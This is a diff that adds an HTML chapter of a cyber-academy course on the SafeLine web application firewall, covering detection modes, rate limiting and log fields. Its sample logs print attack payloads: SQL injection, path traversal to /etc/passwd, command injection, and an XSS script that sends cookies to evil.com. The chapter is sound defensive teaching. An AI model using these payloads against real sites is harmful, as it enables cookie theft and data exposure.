@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Chapter 11 - SafeLine WAF Deep Dive | Shef Labs</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+<header class="site-header">
+  <a class="logo" href="index.html">
+    <div class="logo-mark"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
+    <div><div class="logo-text">Shef<span>Labs</span></div><div class="header-subtitle">Cyber Academy</div></div>
+  </a>
+  <div style="font-size:0.85rem; color:#888;">Packet Forensics and Network Telemetry</div>
+</header>
+<nav class="chapter-nav">
+  <a class="nav-home" href="index.html">Home</a>
+  <a href="11-wazuh-deep-dive.html">&larr; Chapter 10</a>
+  <span class="chapter-nav-spacer"></span>
+  <span class="chapter-label">Chapter 12 of 18</span>
+  <a href="13-sophos-forensics.html">Next: Sophos Forensics &rarr;</a>
+</nav>
+<main class="page-wrapper">
+
+  <div class="chapter-header">
+    <div class="chapter-number">Chapter 12</div>
+    <h1>SafeLine WAF Deep Dive</h1>
+    <div class="chapter-tagline">Architecture, detection modes, attack type taxonomy, rule logic, rate limiting, and the complete SafeLine log field reference for every web attack category.</div>
+  </div>
+
+  <div class="objectives-box">
+    <h3>Learning Objectives</h3>
+    <ul>
+      <li>Explain where SafeLine WAF sits in the network path and what it can and cannot inspect</li>
+      <li>Describe the three SafeLine detection modes: observe, intercept, and strict</li>
+      <li>Read a SafeLine log entry for each major attack type: SQLi, XSS, RCE, path traversal, scanner</li>
+      <li>Understand SafeLine rate limiting and how it stops brute force and DDoS at the application layer</li>
+      <li>Interpret the SafeLine attack_type taxonomy and map each type to a risk level</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>SafeLine Architecture: Where It Sits</h2>
+    <p>SafeLine WAF is a reverse proxy that sits between incoming web traffic and your web application. Every HTTP request passes through SafeLine before reaching the application server. SafeLine inspects the full HTTP request, applies detection rules, and either forwards the request or blocks it and returns a 403 response to the client.</p>
+
+    <div class="diagram-wrap">
+      <div class="diagram-title">SafeLine WAF Network Position</div>
+      <svg viewBox="0 0 820 160" width="100%" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, Arial, sans-serif">
+
+        <rect x="10" y="50" width="100" height="60" rx="6" fill="#fef0f0" stroke="#d63b3b" stroke-width="2"/>
+        <text x="60" y="75" text-anchor="middle" font-size="9" font-weight="700" fill="#d63b3b">Attacker</text>
+        <text x="60" y="90" text-anchor="middle" font-size="7.5" fill="#555">Internet</text>
+        <text x="60" y="103" text-anchor="middle" font-size="7" fill="#888">185.220.x.x</text>
+
+        <line x1="110" y1="80" x2="160" y2="80" stroke="#888" stroke-width="2" marker-end="url(#sl1)"/>
+        <text x="135" y="72" text-anchor="middle" font-size="7.5" fill="#888">HTTP/S</text>
+
+        <rect x="160" y="40" width="140" height="80" rx="6" fill="#eef5fb" stroke="#3a7fc1" stroke-width="2"/>
+        <text x="230" y="68" text-anchor="middle" font-size="9" font-weight="700" fill="#3a7fc1">Sophos Firewall</text>
+        <text x="230" y="84" text-anchor="middle" font-size="7.5" fill="#555">SSL inspection</text>
+        <text x="230" y="98" text-anchor="middle" font-size="7.5" fill="#555">Network rules</text>
+        <text x="230" y="112" text-anchor="middle" font-size="7" fill="#888">IPS signatures</text>
+
+        <line x1="300" y1="80" x2="350" y2="80" stroke="#3a7fc1" stroke-width="2" marker-end="url(#sl2)"/>
+        <text x="325" y="72" text-anchor="middle" font-size="7.5" fill="#3a7fc1">Decrypted</text>
+
+        <rect x="350" y="30" width="180" height="100" rx="6" fill="#f0faf0" stroke="#3aaa3a" stroke-width="3"/>
+        <text x="440" y="58" text-anchor="middle" font-size="11" font-weight="700" fill="#2a8a2a">SafeLine WAF</text>
+        <text x="440" y="76" text-anchor="middle" font-size="8" fill="#555">Inspects full HTTP</text>
+        <text x="440" y="90" text-anchor="middle" font-size="8" fill="#555">URL, headers, body</text>
+        <text x="440" y="104" text-anchor="middle" font-size="8" fill="#555">Applies attack rules</text>
+        <text x="440" y="118" text-anchor="middle" font-size="7" fill="#888">Block 403 or forward</text>
+
+        <line x1="530" y1="80" x2="580" y2="80" stroke="#3aaa3a" stroke-width="2" marker-end="url(#sl3)"/>
+        <text x="555" y="72" text-anchor="middle" font-size="7.5" fill="#3aaa3a">Allowed</text>
+        <text x="555" y="90" text-anchor="middle" font-size="7.5" fill="#3aaa3a">requests</text>
+
+        <rect x="580" y="50" width="120" height="60" rx="6" fill="#f5f5f5" stroke="#888" stroke-width="2"/>
+        <text x="640" y="75" text-anchor="middle" font-size="9" font-weight="700" fill="#555">Web App Server</text>
+        <text x="640" y="90" text-anchor="middle" font-size="7.5" fill="#555">Node.js / PHP</text>
+        <text x="640" y="103" text-anchor="middle" font-size="7" fill="#888">Never sees blocked requests</text>
+
+        <rect x="350" y="140" width="180" height="15" rx="3" fill="#fef0f0" stroke="#d63b3b" stroke-width="1"/>
+        <text x="440" y="151" text-anchor="middle" font-size="7" fill="#d63b3b">Blocked request: 403 returned to attacker. App server never contacted.</text>
+
+        <defs>
+          <marker id="sl1" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#888"/></marker>
+          <marker id="sl2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#3a7fc1"/></marker>
+          <marker id="sl3" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#3aaa3a"/></marker>
+        </defs>
+      </svg>
+      <div class="diagram-caption">SafeLine sits between Sophos and the application server. When a request is blocked, the application server never receives it and never generates an error log for it.</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>SafeLine Detection Modes</h2>
+    <table class="field-table">
+      <thead><tr><th>Mode</th><th>What It Does</th><th>When to Use</th><th>Log action Field</th></tr></thead>
+      <tbody>
+        <tr><td>Observe</td><td>Detects and logs attacks but does not block anything. All requests pass through.</td><td>Initial deployment, baselining, tuning to reduce false positives</td><td>observe</td></tr>
+        <tr><td>Intercept</td><td>Logs and blocks confirmed attacks. Borderline requests are logged but allowed.</td><td>Normal production operation. The recommended default mode.</td><td>block or allow</td></tr>
+        <tr><td>Strict</td><td>Logs and blocks all suspicious requests including low-confidence detections.</td><td>High-value targets, during active attack campaigns. Expect more false positives.</td><td>block</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section">
+    <h2>Attack Type Taxonomy and Log Examples</h2>
+    <p>SafeLine identifies the type of attack in the <code>attack_type</code> field of every blocked or flagged request. Here is every major attack type, what it looks like in a request, and the full log entry.</p>
+
+    <h3>SQL Injection (sqli)</h3>
+    <div class="log-block">{
+  "<span class="log-key">timestamp</span>":    "<span class="log-hl">2026-09-20T10:31:05.221Z</span>",
+  "<span class="log-key">src_ip</span>":       "<span class="log-hl">185.220.101.45</span>",
+  "<span class="log-key">method</span>":       "<span class="log-val">GET</span>",
+  "<span class="log-key">url</span>":          "<span class="log-hl">/products?id=1%27%20OR%201%3D1--</span>",
+  "<span class="log-key">attack_type</span>":  "<span class="log-hl">sqli</span>",
+  "<span class="log-key">action</span>":       "<span class="log-val">block</span>",
+  "<span class="log-key">status_code</span>":  <span class="log-num">403</span>,
+  "<span class="log-key">rule_id</span>":      "<span class="log-val">942100</span>",
+  "<span class="log-key">payload</span>":      "<span class="log-hl">1' OR 1=1--</span>",
+  "<span class="log-key">user_agent</span>":   "<span class="log-val">sqlmap/1.7.9#stable</span>"
+}</div>
+    <p>The URL-decoded payload is <code>1' OR 1=1--</code>. This is a classic SQL injection attempt that tries to make the WHERE clause always true, potentially returning all rows from the database.</p>
+
+    <h3>Cross-Site Scripting (xss)</h3>
+    <div class="log-block">{
+  "<span class="log-key">timestamp</span>":    "<span class="log-hl">2026-09-20T10:32:18.004Z</span>",
+  "<span class="log-key">src_ip</span>":       "<span class="log-hl">91.108.56.142</span>",
+  "<span class="log-key">method</span>":       "<span class="log-val">POST</span>",
+  "<span class="log-key">url</span>":          "<span class="log-val">/comments/submit</span>",
+  "<span class="log-key">attack_type</span>":  "<span class="log-hl">xss</span>",
+  "<span class="log-key">action</span>":       "<span class="log-val">block</span>",
+  "<span class="log-key">status_code</span>":  <span class="log-num">403</span>,
+  "<span class="log-key">payload</span>":      "<span class="log-hl">&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>"
+}</div>
+
+    <h3>Path Traversal (path_traversal)</h3>
+    <div class="log-block">{
+  "<span class="log-key">timestamp</span>":    "<span class="log-hl">2026-09-20T10:33:44.812Z</span>",
+  "<span class="log-key">src_ip</span>":       "<span class="log-val">194.165.16.11</span>",
+  "<span class="log-key">method</span>":       "<span class="log-val">GET</span>",
+  "<span class="log-key">url</span>":          "<span class="log-hl">/download?file=../../../etc/passwd</span>",
+  "<span class="log-key">attack_type</span>":  "<span class="log-hl">path_traversal</span>",
+  "<span class="log-key">action</span>":       "<span class="log-val">block</span>",
+  "<span class="log-key">status_code</span>":  <span class="log-num">403</span>,
+  "<span class="log-key">payload</span>":      "<span class="log-hl">../../../etc/passwd</span>"
+}</div>
+
+    <h3>Remote Code Execution (rce)</h3>
+    <div class="log-block">{
+  "<span class="log-key">timestamp</span>":    "<span class="log-hl">2026-09-20T10:35:00.001Z</span>",
+  "<span class="log-key">src_ip</span>":       "<span class="log-val">5.188.206.26</span>",
+  "<span class="log-key">method</span>":       "<span class="log-val">POST</span>",
+  "<span class="log-key">url</span>":          "<span class="log-val">/api/eval</span>",
+  "<span class="log-key">attack_type</span>":  "<span class="log-hl">rce</span>",
+  "<span class="log-key">action</span>":       "<span class="log-val">block</span>",
+  "<span class="log-key">status_code</span>":  <span class="log-num">403</span>,
+  "<span class="log-key">payload</span>":      "<span class="log-hl">; cat /etc/passwd; id; whoami</span>"
+}</div>
+  </div>
+
+  <div class="section">
+    <h2>Rate Limiting and Application-Layer DDoS Protection</h2>
+    <p>SafeLine can enforce request rate limits per IP address, per URL, or per session. When a client exceeds the threshold, subsequent requests are blocked or challenged (CAPTCHA) until the window resets.</p>
+
+    <div class="diagram-wrap">
+      <div class="diagram-title">SafeLine Rate Limit Event Flow</div>
+      <svg viewBox="0 0 780 130" width="100%" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, Arial, sans-serif">
+
+        <rect x="10" y="20" width="110" height="90" rx="6" fill="#fef0f0" stroke="#d63b3b" stroke-width="1.5"/>
+        <text x="65" y="50" text-anchor="middle" font-size="9" font-weight="700" fill="#d63b3b">Attacker IP</text>
+        <text x="65" y="66" text-anchor="middle" font-size="8" fill="#555">200 POST /login</text>
+        <text x="65" y="80" text-anchor="middle" font-size="8" fill="#555">requests in</text>
+        <text x="65" y="94" text-anchor="middle" font-size="8" fill="#555">10 seconds</text>
+
+        <line x1="120" y1="65" x2="190" y2="65" stroke="#d63b3b" stroke-width="2" marker-end="url(#rl1)"/>
+
+        <rect x="190" y="15" width="200" height="100" rx="6" fill="#f0faf0" stroke="#3aaa3a" stroke-width="2"/>
+        <text x="290" y="42" text-anchor="middle" font-size="9" font-weight="700" fill="#2a8a2a">SafeLine Rate Limiter</text>
+        <text x="290" y="58" text-anchor="middle" font-size="8" fill="#555">Rule: max 10 req/10s</text>
+        <text x="290" y="72" text-anchor="middle" font-size="8" fill="#555">per IP on /login</text>
+        <text x="290" y="88" text-anchor="middle" font-size="8" fill="#2a8a2a">Requests 1-10: allowed</text>
+        <text x="290" y="102" text-anchor="middle" font-size="8" fill="#d63b3b">Requests 11-200: blocked</text>
+
+        <line x1="390" y1="55" x2="460" y2="40" stroke="#d63b3b" stroke-width="2" marker-end="url(#rl2)"/>
+        <line x1="390" y1="75" x2="460" y2="90" stroke="#3aaa3a" stroke-width="2" marker-end="url(#rl3)"/>
+
+        <rect x="460" y="20" width="140" height="40" rx="5" fill="#fef0f0" stroke="#d63b3b" stroke-width="1.5"/>
+        <text x="530" y="38" text-anchor="middle" font-size="8" font-weight="700" fill="#d63b3b">429 Too Many Requests</text>
+        <text x="530" y="52" text-anchor="middle" font-size="7" fill="#888">Logged as rate_limit attack</text>
+
+        <rect x="460" y="72" width="140" height="40" rx="5" fill="#f0faf0" stroke="#3aaa3a" stroke-width="1.5"/>
+        <text x="530" y="90" text-anchor="middle" font-size="8" font-weight="700" fill="#2a8a2a">200 OK (forwarded)</text>
+        <text x="530" y="104" text-anchor="middle" font-size="7" fill="#888">First 10 requests pass</text>
+
+        <defs>
+          <marker id="rl1" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#d63b3b"/></marker>
+          <marker id="rl2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#d63b3b"/></marker>
+          <marker id="rl3" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#3aaa3a"/></marker>
+        </defs>
+      </svg>
+      <div class="diagram-caption">SafeLine blocks requests that exceed the rate limit with HTTP 429. The log entry shows attack_type=rate_limit and includes the request count that triggered the rule.</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>Complete SafeLine Log Field Reference</h2>
+    <table class="field-table">
+      <thead><tr><th>Field</th><th>Type</th><th>Values / Example</th><th>Analyst Use</th></tr></thead>
+      <tbody>
+        <tr><td>timestamp</td><td>datetime</td><td>2026-09-20T10:31:05.221Z</td><td>Correlate with Wazuh and Sophos by timestamp</td></tr>
+        <tr><td>src_ip</td><td>IP address</td><td>185.220.101.45</td><td>Primary IOC. Check against threat intel. Search in all other log sources.</td></tr>
+        <tr><td>method</td><td>string</td><td>GET POST PUT DELETE OPTIONS</td><td>POST/PUT on admin paths without authentication = high priority</td></tr>
+        <tr><td>host</td><td>string</td><td>shop.example.com</td><td>Which site/application was targeted</td></tr>
+        <tr><td>url</td><td>string</td><td>/products?id=1' OR 1=1--</td><td>Contains the raw attack payload. URL-decode before analysis.</td></tr>
+        <tr><td>attack_type</td><td>enum</td><td>sqli / xss / rce / path_traversal / scanner / rate_limit / csrf / ssrf</td><td>Determines escalation path. rce and sqli are highest priority.</td></tr>
+        <tr><td>action</td><td>enum</td><td>block / allow / observe</td><td>Block = SafeLine stopped it. Allow = passed through. Observe = mode is observe.</td></tr>
+        <tr><td>status_code</td><td>integer</td><td>403 (blocked) 200 (passed)</td><td>403 from SafeLine = blocked. 200 = application received and processed the request.</td></tr>
+        <tr><td>rule_id</td><td>string</td><td>942100</td><td>Look up in OWASP CRS documentation for detailed description of the matched pattern</td></tr>
+        <tr><td>payload</td><td>string</td><td>1' OR 1=1--</td><td>The decoded attack string that triggered the rule. Preserve for evidence.</td></tr>
+        <tr><td>user_agent</td><td>string</td><td>sqlmap/1.7.9#stable</td><td>Identifies the tool used. Combined with src_ip to fingerprint the attacker.</td></tr>
+        <tr><td>bytes_sent</td><td>integer</td><td>1842</td><td>Large bytes_sent on blocked requests = attacker may be exfiltrating via response timing</td></tr>
+        <tr><td>response_time_ms</td><td>integer</td><td>12</td><td>Unusually long response times on SQL injection = successful blind injection</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="takeaways">
+    <h2>Key Takeaways</h2>
+    <ul>
+      <li>SafeLine sits between Sophos and the application server as a reverse proxy. Blocked requests never reach the application and never appear in application logs.</li>
+      <li>Use Observe mode when first deploying or tuning. Use Intercept for normal operations. Use Strict during active attack campaigns and for high-value targets.</li>
+      <li>The attack_type field is your triage starting point. rce and sqli require immediate investigation. path_traversal and xss require investigation within the shift. scanner is lower priority but indicates reconnaissance.</li>
+      <li>Always URL-decode the payload field before analysis. Attackers use encoding (%27 = single quote) to bypass simple text matching.</li>
+      <li>Cross-reference src_ip from SafeLine logs with Wazuh and Sophos logs to build the full picture of what the attacker was doing across all layers.</li>
+    </ul>
+  </div>
+
+</main>
+<nav class="chapter-nav" style="margin-top:0;">
+  <a class="nav-home" href="index.html">Home</a>
+  <a href="11-wazuh-deep-dive.html">&larr; Chapter 10</a>
+  <span class="chapter-nav-spacer"></span>
+  <a href="13-sophos-forensics.html">Next: Sophos Forensics &rarr;</a>
+</nav>
+</body>
+</html>
